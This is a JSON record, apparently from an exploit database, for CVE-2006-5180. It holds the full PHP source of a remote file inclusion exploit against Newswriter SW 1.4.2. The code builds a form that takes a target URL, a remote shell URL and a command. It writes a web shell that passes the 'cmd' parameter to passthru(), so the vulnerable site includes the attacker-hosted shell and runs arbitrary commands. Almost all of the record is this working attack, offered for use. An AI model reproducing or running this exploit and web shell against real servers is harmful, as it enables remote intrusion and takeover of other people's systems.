{
  "id": "2443",
  "title": "Newswriter SW 1.4.2 - &#039;main.inc.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-5180",
  "vuln_type": "unknown",
  "code": "<?php\r\n/* XORON - TURKISH HACKER\r\n\r\nThanx: str0ke, Ironfist, Preddy,\r\n\r\n*/\r\n\r\n$cmd = $_POST[\"cmd\"];\r\n$glowna = $_POST[\"glowna\"];\r\n$shell = $_POST[\"shell\"];\r\n$exp= \"<title>Newswriter SW v1.4.2 Remote File Include Exploit :: XORON :: \r\nTURKISH HACKER ::</title>\"\r\n.\"<style type=\\\"text/css\\\">\"\r\n.\"body {background-color: #006600;}\"\r\n.\"body,td,th {color: #FFFFFF;}\"\r\n.\"</style><form method=\\\"post\\\" action=\\\"\".$glowna.$shell.\"?cmd=\".$cmd.\"\\\">\"\r\n.\"<div align=\\\"center\\\"><img src=\\\"http://xoron.biz/teamvh4.png\\\"></div>\"\r\n.\"<p align=\\\"center\\\">script url: (ex. \r\nhttp://www.site.com/[script_path]/include/main.inc.php?NWCONF_SYSTEM[server_path]=)<br>\"\r\n.\"<input type=\\\"text\\\" name=\\\"glowna\\\" size=\\\"90\\\"\".$glowna.\"\\\">\"\r\n.\"<br>\"\r\n.\"shell url: (ex. http://www.site.com/[path]/shell.txt?) shell.txt (CHMOD \r\n777)<br>\"\r\n.\"<input type=\\\"text\\\" name=\\\"shell\\\" size=\\\"90\\\"\".$shell.\"\\\">\"\r\n.\"<br>\"\r\n.\"cmd: (ex. ls -la)<br>\"\r\n.\"<input name=\\\"cmd\\\" type=\\\"text\\\" size=\\\"90\\\"\".$cmd.\"\\\">\"\r\n.\"<br>\"\r\n.\"<input type=\\\"submit\\\" value=\\\"Exploit\\\" name=\\\"submit\\\">\"\r\n.\"</p>\"\r\n.\"<p align=\\\"center\\\">Find by: <a \r\nhref=\\\"mailto:x0r0n@hotmail.com\\\">XORON</a>\"\r\n.\"<br>\"\r\n.\"<p align=\\\"center\\\"> <a \r\nhref=\\\"http://www.xoron.biz/\\\">http://www.xoron.biz/</a></p>\"\r\n.\"<p align=\\\"center\\\" class=\\\"name\\\">&nbsp;</p>\"\r\n.\"<HR WIDTH=\\\"650\\\" ALIGN=\\\"center\\\">\"\r\n.\"<p align=\\\"center\\\"> Special Greetz: Str0ke, Ironfist, Preddy, rgod  \r\n;-)<br>\"\r\n.\"<br>\"\r\n.\"<p align=\\\"center\\\">&nbsp;</p>\"\r\n.\"</form>\";\r\n\r\nif (!isset($_POST['submit']))\r\n{\r\necho $exp;\r\n}else{\r\n$file = fopen (\"shell.txt\", \"w+\");\r\nfwrite($file, '<?php \r\nob_clean();echo\"xoron-turkish-hacker\";ini_set(\"max_execution_time\",0);passthru($_GET[\"cmd\"]);die;?>');\r\nfclose($file);\r\n$file = fopen ($shell, \"r\");\r\nif (!$file) {\r\n    echo \"<p>Don't Find shell :( Insert in FTP shell.txt.\\n\";\r\n    exit;\r\n}\r\necho $exp;\r\nwhile (!feof ($file)) {\r\n    $line .= fgets ($file, 1024).\"<br>\";\r\n    }\r\n$tpos1 = strpos($line, \"++BEGIN++\");\r\n$tpos2 = strpos($line, \"++END++\");\r\n$tpos1 = $tpos1+strlen(\"++BEGIN++\");\r\n$tpos2 = $tpos2-$tpos1;\r\n$output = substr($line, $tpos1, $tpos2);\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-09-27]",
  "url": "https://www.exploit-db.com/exploits/2443"
}